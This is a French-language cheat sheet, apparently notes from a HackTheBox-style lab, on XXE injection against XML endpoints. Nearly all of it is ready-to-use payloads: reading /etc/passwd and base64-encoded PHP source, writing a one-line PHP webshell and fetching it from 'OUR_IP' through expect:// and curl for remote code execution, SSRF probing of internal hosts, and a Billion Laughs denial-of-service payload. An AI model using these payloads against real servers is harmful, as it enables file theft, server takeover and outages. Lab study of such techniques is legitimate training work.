# XXE – Local File Disclosure

## 1. Identification

### Exemple de requête interceptée
```
POST /submitDetails.php
Content-Type: application/xml

<root>
  <name>Amy</name>
  <tel>123</tel>
  <email>email@xxe.htb</email>
  <message>Hello</message>
</root>
```

➡️ La valeur de `<email>` est reflétée dans la réponse → surface d’injection XXE.

## 2. Test d’injection simple

```
<!DOCTYPE email [
  <!ENTITY company "Inlane Freight">
]>
<root>
  <name>Amy</name>
  <tel>123</tel>
  <email>&company;</email>
  <message>Hello</message>
</root>
```

Réponse : `Check your email Inlane Freight for further instructions.`  
✅ Confirme l’injection XXE.

## 3. Lecture de fichiers locaux

```
<!DOCTYPE email [
  <!ENTITY company SYSTEM "file:///etc/passwd">
]>
<root>
  <name>Amy</name>
  <tel>123</tel>
  <email>&company;</email>
  <message>Hello</message>
</root>
```

➡️ Retourne le contenu de `/etc/passwd`.

## 4. Lecture de code source (PHP wrapper)

```
<!DOCTYPE email [
  <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>
<root>
  <name>Amy</name>
  <tel>123</tel>
  <email>&company;</email>
  <message>Hello</message>
</root>
```

➡️ Retourne le contenu **base64** de `index.php`.  
Décoder avec Burp ou `base64 -d`.

## 5. Remote Code Execution (si `expect://` activé)

### Déployer un webshell
```
echo '<?php system($_REQUEST["cmd"]);?>' > shell.php
sudo python3 -m http.server 80
```

### Injection XXE pour fetch le shell
```
<?xml version="1.0"?>
<!DOCTYPE email [
  <!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'OUR_IP/shell.php'">
]>
<root>
  <name></name>
  <tel></tel>
  <email>&company;</email>
  <message></message>
</root>
```

➡️ `shell.php` téléchargé → accès RCE via `?cmd=id`.

## 6. Autres attaques XXE

### SSRF
Utiliser `SYSTEM "http://127.0.0.1:8080/admin"` pour scanner ports ou intranet.

### DOS (Billion Laughs Attack)
```
<?xml version="1.0"?>
<!DOCTYPE email [
  <!ENTITY a0 "DOS">
  <!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
  <!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
  <!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
  <!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
  <!ENTITY a5 "&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;">
  <!ENTITY a6 "&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;">
  <!ENTITY a7 "&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;">
  <!ENTITY a8 "&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;">
  <!ENTITY a9 "&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;">
  <!ENTITY a10 "&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;">
]>
<root>
  <name></name>
  <tel></tel>
  <email>&a10;</email>
  <message></message>
</root>
```

➡️ Saturation mémoire (souvent patché sur serveurs modernes).

## 🔑 Points clés
- Chercher les endpoints XML (`Content-Type: application/xml`).  
- Vérifier les éléments reflétés (ex: `<email>`).  
- Utiliser `file://` pour lire, `php://filter/` pour encoder, `expect://` pour exécuter.  
- XXE peut → **LFI, SSRF, RCE, DOS**.

---


